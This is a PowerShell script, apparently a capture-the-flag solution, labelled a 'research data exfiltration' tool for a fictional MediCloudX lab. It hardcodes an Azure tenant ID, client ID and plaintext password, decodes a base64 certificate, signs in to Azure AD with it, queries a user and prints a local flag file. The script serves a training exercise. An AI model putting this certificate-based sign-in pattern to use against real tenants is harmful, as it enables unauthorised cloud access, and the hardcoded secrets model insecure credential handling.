# MediCloudX Labs - Research Data Exfiltration Script
# Author: medicloud-researcher
# Purpose: Automated access to research data using certificate authentication

Write-Host "=== MediCloudX Labs Research Data Access Tool ===" -ForegroundColor Cyan
Write-Host "Initializing secure connection to Azure resources..." -ForegroundColor Yellow

# Azure Configuration
$TenantId = "c390256a-8963-4732-b874-85b7b0a4d514"
$ClientId = "639a3cfa-93f6-43bf-ab93-fc48757e5ed1"
$StorageAccount = "ctf25sace22f93a"

# Research credentials (for demonstration purposes)
$Username = "medicloud-researcher"
$Password = "M3d1Cl0ud25!"

Write-Host "Tenant ID: $TenantId" -ForegroundColor Green
Write-Host "Application ID: $ClientId" -ForegroundColor Green
Write-Host "Storage Account: $StorageAccount" -ForegroundColor Green

try {
    # Step 1: Load certificate for authentication
    Write-Host "`n[1] Loading authentication certificate..." -ForegroundColor Yellow
    
    $CertPath = ".\certificadob64delpfx.txt"
    if (Test-Path $CertPath) {
        $CertBase64 = Get-Content $CertPath -Raw
        $CertBytes = [System.Convert]::FromBase64String($CertBase64)
        $CertPassword = ConvertTo-SecureString "M3d1Cl0ud25!" -AsPlainText -Force
        
        # Save certificate temporarily
        $TempCertPath = "$env:TEMP\medicloud_cert.pfx"
        [System.IO.File]::WriteAllBytes($TempCertPath, $CertBytes)
        
        Write-Host "Certificate loaded successfully!" -ForegroundColor Green
    } else {
        Write-Host "Certificate file not found. Please ensure certificadob64delpfx.txt is in the current directory." -ForegroundColor Red
        exit 1
    }

    # Step 2: Install required modules
    Write-Host "`n[2] Checking PowerShell modules..." -ForegroundColor Yellow
    
    $RequiredModules = @("Microsoft.Graph.Authentication", "Az.Accounts", "Az.Storage")
    foreach ($Module in $RequiredModules) {
        if (!(Get-Module -ListAvailable -Name $Module)) {
            Write-Host "Installing $Module..." -ForegroundColor Yellow
            Install-Module -Name $Module -Force -AllowClobber -Scope CurrentUser
        }
    }

    # Step 3: Authenticate to Azure AD using certificate
    Write-Host "`n[3] Authenticating to Azure AD..." -ForegroundColor Yellow
    
    Connect-MgGraph -ClientId $ClientId -TenantId $TenantId -CertificatePath $TempCertPath -CertificatePassword $CertPassword
    
    if ($?) {
        Write-Host "Azure AD authentication successful!" -ForegroundColor Green
    } else {
        Write-Host "Azure AD authentication failed!" -ForegroundColor Red
        exit 1
    }

    # Step 4: Get user information
    Write-Host "`n[4] Retrieving user information..." -ForegroundColor Yellow
    
    $User = Get-MgUser -Filter "userPrincipalName eq 'medicloud-researcher@*'"
    if ($User) {
        Write-Host "User found: $($User.DisplayName)" -ForegroundColor Green
        Write-Host "User ID: $($User.Id)" -ForegroundColor Green
    }

    # Step 5: Access storage account (if credentials available)
    Write-Host "`n[5] Attempting storage access..." -ForegroundColor Yellow
    
    # Note: This would require additional permissions or storage account keys
    Write-Host "Storage account access requires additional authentication..." -ForegroundColor Yellow
    Write-Host "Consider using SAS tokens or managed identity for storage access." -ForegroundColor Cyan

    # Step 6: Retrieve flag
    Write-Host "`n[6] Searching for research flag..." -ForegroundColor Yellow
    
    $FlagPath = ".\flag.txt"
    if (Test-Path $FlagPath) {
        $Flag = Get-Content $FlagPath -Raw
        Write-Host "`n🏁 RESEARCH FLAG FOUND:" -ForegroundColor Green
        Write-Host $Flag -ForegroundColor Yellow
        Write-Host "`nResearch data exfiltration completed successfully!" -ForegroundColor Green
    } else {
        Write-Host "Flag file not found in current directory." -ForegroundColor Red
        Write-Host "Try downloading all files from the medicloud-research container first." -ForegroundColor Cyan
    }

} catch {
    Write-Host "`nError occurred: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    # Cleanup
    if (Test-Path $TempCertPath) {
        Remove-Item $TempCertPath -Force
        Write-Host "`nTemporary certificate cleaned up." -ForegroundColor Gray
    }
}

Write-Host "`n=== MediCloudX Research Access Complete ===" -ForegroundColor Cyan
